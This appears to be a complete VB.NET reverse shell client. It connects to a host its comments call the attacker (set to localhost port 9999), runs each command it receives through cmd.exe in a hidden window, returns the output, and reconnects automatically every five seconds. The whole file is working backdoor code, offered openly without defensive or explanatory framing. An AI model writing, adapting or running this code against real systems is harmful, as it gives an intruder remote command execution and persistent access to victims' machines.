﻿Imports System.Net.Sockets
Imports System.Diagnostics
Imports System.Text
Imports System.Threading

Module Module1
    Sub Main()
        While True
            Try
                ' Create socket
                Dim client As New TcpClient()

                ' Connect to attacker
                client.Connect("127.0.0.1", 9999)

                ' Incoming data buffer
                Dim stream As NetworkStream = client.GetStream()
                Dim buffer(1023) As Byte
                Dim bytesRead As Integer = stream.Read(buffer, 0, buffer.Length)
                Dim message As String = Encoding.UTF8.GetString(buffer, 0, bytesRead)

                ' Verbose output
                Console.WriteLine("[+] Server: " & message)

                While True
                    ' Get command
                    bytesRead = stream.Read(buffer, 0, buffer.Length)
                    Dim command As String = Encoding.UTF8.GetString(buffer, 0, bytesRead)

                    ' Verbose output
                    Console.WriteLine("[+] Server: " & command)

                    If String.IsNullOrEmpty(command) Then
                        ' Data anomaly / closed connection
                        Exit While
                    End If
                    If command.ToLower() = "goodbye" Then
                        ' Terminate connection
                        client.Close()
                        Environment.Exit(0)
                    End If

                    ' Send command output
                    Dim output As String = ExecuteCommand(command)
                    If String.IsNullOrEmpty(output) Then
                        output = "<null>"
                    End If

                    Dim outputBytes As Byte() = Encoding.UTF8.GetBytes(output)
                    stream.Write(outputBytes, 0, outputBytes.Length)
                End While

                client.Close()
            Catch ex As SocketException When ex.SocketErrorCode = SocketError.ConnectionRefused
                Console.WriteLine("[!] Destination unreachable! Reviving connection in 5 seconds")
                Thread.Sleep(5000)
            Catch ex As Exception
                Console.WriteLine(ex.Message)
                Console.WriteLine("[!] Critical error! Reviving connection in 5 seconds")
                Thread.Sleep(5000)
            End Try
        End While
    End Sub

    Private Function ExecuteCommand(command As String) As String
        Dim process As New Process()
        Dim startInfo As New ProcessStartInfo()
        startInfo.FileName = "cmd.exe"
        startInfo.Arguments = "/C " & command
        startInfo.RedirectStandardOutput = True
        startInfo.UseShellExecute = False
        startInfo.CreateNoWindow = True

        process.StartInfo = startInfo
        process.Start()

        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()

        Return output
    End Function
End Module
